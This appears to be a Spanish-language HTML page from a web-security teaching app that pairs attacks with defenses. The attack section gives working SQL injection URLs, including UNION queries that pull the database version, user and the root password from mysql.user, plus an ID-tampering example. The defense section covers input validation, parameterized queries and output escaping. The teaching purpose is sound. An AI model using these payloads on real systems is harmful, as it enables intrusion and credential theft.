@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<!--
+To change this license header, choose License Headers in Project Properties.
+To change this template file, choose Tools | Templates
+and open the template in the editor.
+-->
+<html>
+    <head>
+        <title>Mu&ntilde;a: Tutor</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link href="../css/bootstrap.css" rel="stylesheet" type="text/css"/>
+        <script src="../js/jquery-2.1.4.js" type="text/javascript"></script>
+        <style type="text/css">
+			h3, h4{
+				color:#900;
+			}
+		</style>
+    </head>
+    <body>
+    <nav class="navbar navbar-inverse navbar-fixed-top">
+       <a class="navbar-brand" href="#"><span class="glyphicon glyphicon-grain"></span> Mu&ntilde;a Tutor</a>
+       <p class="navbar-text navbar-right text-right"><a href="#" onClick="javascript:imprimir()"><span class="glyphicon glyphicon-print"></span>&nbsp;&nbsp;&nbsp;</a></p>
+    </nav>
+
+        <div id='ataque' style="padding: 25px; padding-top:40px; background-color:#FFF5F0">
+          <h3><center>Ataques</center></h3>
+          <h4>Ataques de Inyeccion Sql</h4>
+          <h5><strong>Ejemplos:</strong></h5>
+          <p>Tenemos la siguiente consulta que nos devuelve la informacion del usuario autenticado al sistema.</p>
+          <p>	$sql = &quot;select * from libro where IdLibro = '$id'&quot;;</p>
+          <p>podemos manipular el valor que le mandamos, por la url, al parámetro id.</p>
+          <hr/>
+          <p>Mandamos como parámetro -1 para ver que no nos devuelva ningún registro y no arroje ningún error.</p>
+          <p>http://.../muna/perfil.php?id=-1</p>
+          <hr/>
+          <p>Podemos forzar ver la lista de todos los libros ccon esta inyección.</p>
+          <p>http://.../muna/perfil.php?id=-1' or '1'='1</p>
+          <hr/>
+          <p>Averiguamos la cantidad de columnas que devuelve la consulta. En este ejemplo en particular devuelve todas las columnas de la tabla usuario que tiene 6 campos.</p>
+          <p>http://.../muna/perfil.php?id=-1' UNION SELECT ALL 1,2,3,4,5,6,7 '-- </p>
+          <hr/>
+          <p>Podemos averiguar la version del gestor de la base de datos.</p>
+          <p>http://.../muna/perfil.php?id=-1' UNION SELECT ALL 1,2,@@version,4,5,6,7 '-- </p>
+          <hr/>
+          <p>Recuperamos el nombre de la base de datos que está usando la aplicación web.</p>
+          <p>http://.../muna/perfil.php?id=-1' UNION SELECT ALL 1,2,DATABASE(),4,5,6,7 '-- </p>
+          <hr/>
+          <p>Con un poco mas de esfuerzo, podemos averiguar el usuario de la base de datos. </p>
+<p>http://.../muna/perfil.php?id=-1'  union all select 1,2,3,(select user()),5,6,7 '-- </p>
+<hr/>
+<p>Como ya tenemos al usuario de la base de datos, podemos averiguar su password. </p>
+<p>http://.../muna/perfil.php?id=-1' union all select 1,2,3,(select password from mysql.user where user='root' LIMIT 0,1),5,6,7 '-- </p>
+<hr/>
+<p>&nbsp;</p>
+    <h4>Acceso indirecto a datos de terceros</h4>
+    <p>A travéz de la url se podría acceder al perfil de otro usuario, solo tendríamos que jugar con los números de id</p>
+    <hr/>
+    <p>http://.../muna/detalleLibro.php?idLibro=15</p>
+    <p>http://.../muna/detalleLibro.php?idLibro=18    </p>
+    <hr/>
+    </div>
+        <div id='defensa' style="padding: 20px; background-color:#EAFFEA">
+          <h3><center>Defensa</center></h3>
+          <h4>Ataques de Inyeccion Sql y XSS</h4>
+            <p>Para evitar ataques del tipo inyección SQL y/o del tipo XSS debemos validar y filtrar los datos de entrada..</p>
+          <p>En la clase &quot;Libro.class.php&quot; en el método &quot;public function BuscarPorId($id)&quot; descomente el codigo asociado a la Seguridad de inyección sql.</p>
+            <pre> 
+$bool = ( !is_int($id) ? (ctype_digit($id)) : true );
+if(!$bool) 
+$id = 0;
+            </pre>
+            <p>...</p>
+            <p>Una opción aún mejor es utilizar <em><strong>consultas parametrizadas</strong></em>, en la clase &quot;Seguridad.class.php&quot; se tienen los métodos para usar este tipo de consultas. Recuerde que es mejor tener seguridad redundante que no tener ningún tipo de seguridad.</p>
+            <hr/>
+            <p>Si hemos sido victimas de un ataque de inyección SQL o XSS, debemos<em><strong> escapar las salidas, </strong></em>para que el código inyectado no se ejecute.</p>
+          <p>En &quot;detallelibro.php&quot; busque el código php donde se imprime alguna información en pantalla, y reemplazelo utilizando la funcion htmlentities.</p>
+            <pre>
+...
+echo htmlentities(utf8_encode($f['Descripcion']));
+...</pre>
+            <p>&nbsp;</p>
+        </div>
+    </body>
+    <script type="text/javascript">
+	function imprimir() 
+	{
+			if (window.print)
+				window.print()
+			else
+				alert("Para imprimir presione Crtl+P.");
+	}
+	</script>
+</html>
